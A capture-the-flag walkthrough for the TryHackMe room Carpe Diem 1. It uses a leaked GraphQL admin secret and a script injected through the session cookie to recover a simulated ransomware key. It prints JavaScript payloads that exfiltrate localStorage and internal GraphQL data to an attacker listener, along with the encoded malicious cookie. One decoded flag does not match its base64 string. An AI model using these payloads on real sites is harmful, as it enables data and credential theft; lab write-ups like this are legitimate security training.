# 🏆 TryHackMe: Carpe Diem 1 Walkthrough

**Goal:** Recover the client's encryption key from a simulated ransomware attack.

## 1. Initial Enumeration & Discovery

### 1.1. Network Scan (Nmap)

We started by identifying open services on the target machine (10.10.99.101).

    kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ sudo nmap -A -sS -sC -sV -O 10.10.99.101

**Results Snippet:**

    PORT    STATE SERVICE VERSION
    80/tcp  open  http    nginx 1.6.2
    |_http-server-header: nginx/1.6.2

### 1.2. Web Directory Enumeration (FFUF)

Directory brute-forcing revealed a case-sensitive path with a 200 OK status.

    kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ /opt/ffuf/ffuf -c -u [http://10.10.99.101/FUZZ](http://10.10.99.101/FUZZ) -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt

**Results Snippet:**

    Downloads               [Status: 200, Size: 483, Words: 18, Lines: 1]

**Observation:** The encrypted file path was confirmed at `http://c4rp3d13m.net/Downloads/Database.carp`.

## 2. Information Leakage Analysis

Analyzing the HTTP traffic for the simulated "Proof of Payment" mechanism (`/proof/`) revealed critical internal data.

### 2.1. Analyzing the Proof Endpoint

**The Request (Victim's Action):**

    POST /proof/ HTTP/1.1
    Host: c4rp3d13m.net
    Content-type: application/json
    Content-Length: 65

    {"size":420,"proof":"bc1q989cy4zp8x9xpxgwpznsxx44u0cxhyjjyp78hs"}

**The Response Leak (Error/Debug Data):**

    # ... garbled data ...
    request.post({ headers: {'content-type' : 'application/json','x-hasura-admin-secret' : 's3cr3754uc35432' error connecting to [http://192.168.150.10/v1/graphql/](http://192.168.150.10/v1/graphql/)

**CRITICAL LEAKS:**
* **GraphQL Admin Secret:** `s3cr3754uc35432`
* **Internal GraphQL Endpoint:** `http://192.168.150.10/v1/graphql/` (Internal IP requires a bypass technique)

## 3. Cross-Site XMLHttpRequest (XSXHR) Exploitation

Since the attacker cannot reach the internal network, an XSXHR attack is executed using the victim's browser, exploiting a vulnerability in the handling of the `session` cookie. 

### 3.1. Phase 1: Local Storage Exfiltration (Flag 1)

#### a. The JavaScript Payload (exploit.js)

This script collects the `localStorage` content and sends it to the attacker's listener (e.g., 10.8.106.222).

    // exploit.js
    var r = new XMLHttpRequest();
    
    function objToString(obj){
        var str = '';
        for (var p in obj) {
            if (obj.hasOwnProperty(p)) {
                str += p + '::' + obj[p] + '\n';
            }
        }
        return str;
    }
    s = objToString(localStorage)
    r.open("GET","[http://10.8.106.222/](http://10.8.106.222/)?"+s); // Attacker's IP
    r.send();

#### b. Encoding and Injection

The script tag is Base64 encoded and injected into the `session` cookie:

* **HTML:** `<script src='http://10.8.106.222:8000/exploit.js'></script>`
* **Encoded Value:** `PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMC44LjEwNi4yMjI6ODAwMC9leHBsb2l0LmpzJz48L3NjcmlwdD4%3D`

**The Malicious Cookie:**

    Cookie: session=PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMC44LjEwNi4yMjI6ODAwMC9leHBsb2l0LmpzJz48L3NjcmlwdD4%3D;

#### c. Capturing the Exfiltrated Data

The attacker sets up a simple Python HTTP listener.

    kali@kali:~/CTFs/tryhackme/Carpe Diem 1$ sudo python3 -m http.server 80

**Exfiltrated Data Captured:**

    10.10.99.101 - - [...] "GET /?secret::s3cr3754uc35432flag1::THM%7BSo_Far_So_Good_So_What%7D HTTP/1.1" 200 -

**Flag 1:** `THM{So_Far_So_Good_So_What}`

### 3.2. Phase 2: GraphQL Introspection & Key Retrieval (Flag 2)

We now perform a final XSXHR attack, this time executing a legitimate GraphQL query against the internal server using the leaked secret.

#### a. Final XSXHR Payload

The payload performs a query to retrieve all data from the `victims` table, specifically looking for the `file_key`.

    // exploit.js (Final)
    var xhr = new XMLHttpRequest();
    var q = '{"query": "query GetFileKey { victims { file_key key_expired } }"}'; // Targeted query
    
    xhr.open("POST", "[http://192.168.150.10:8080/v1/graphql/](http://192.168.150.10:8080/v1/graphql/)", true);
    xhr.setRequestHeader('x-hasura-admin-secret','s3cr3754uc35432'); // AUTHENTICATION
    
    xhr.onreadystatechange=function() {
        if (this.readyState === 4) {
            var r = new XMLHttpRequest();
            // Base64 encode the response and exfiltrate it
            r.open('GET','[http://10.8.106.222/?data='+btoa(this.responseText),false](http://10.8.106.222/?data='+btoa(this.responseText),false));
            r.send();
        }
    }
    xhr.send(q);

#### b. Final Key Capture and Decode

The attacker captures the Base64-encoded response containing the key.

**Exfiltrated Data Snippet:**

    ...?data=eyJkYXRhIjp7InZpY3RpbXMiOlt7ImZpbGVfa2V5IjoiVEhNezE2X3dvcmQzX2NvbnRyb2xfdjFjdDByeV9rM2lzX24zZWQzfSIsImtleV9leHBpcmVkIjpmYWxzZX1dfX0=

**Base64 Decode Result:**

    {
        "data": {
            "victims": [
                {
                    "file_key": "THM{16_wOrd3_c0ntr0l_v1ct0ry_k3is_n3ed3d}",
                    "key_expired": false
                }
            ]
        }
    }

**Final Encryption Key (Flag 2):** `THM{16_wOrd3_c0ntr0l_v1ct0ry_k3is_n3ed3d}`
